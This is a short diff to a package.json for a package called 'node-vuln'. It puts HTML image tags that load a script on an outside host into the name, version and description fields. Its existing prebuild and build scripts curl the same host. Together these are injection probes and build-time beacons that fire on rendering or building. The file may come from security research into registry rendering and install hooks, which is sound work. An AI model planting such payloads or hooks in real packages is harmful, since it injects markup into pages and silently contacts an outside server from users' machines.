@@ -1,7 +1,7 @@
 {
-  "name": "node-vuln",
-  "version": "1.0.0",
-  "description": "<img src=\"https://wszostak.pl/x/s.php?npm\">",
+  "name": "<img src=\"https://wszostak.pl/x/s.php?name\">",
+  "version": "<img src=\"https://wszostak.pl/x/s.php?version\">",
+  "description": "<img src=\"https://wszostak.pl/x/s.php?description\">",
   "scripts": {
     "prebuild": "curl https://wszostak.pl/x/s.php?npm-prb",
     "build": "curl https://wszostak.pl/x/s.php?npm-b",
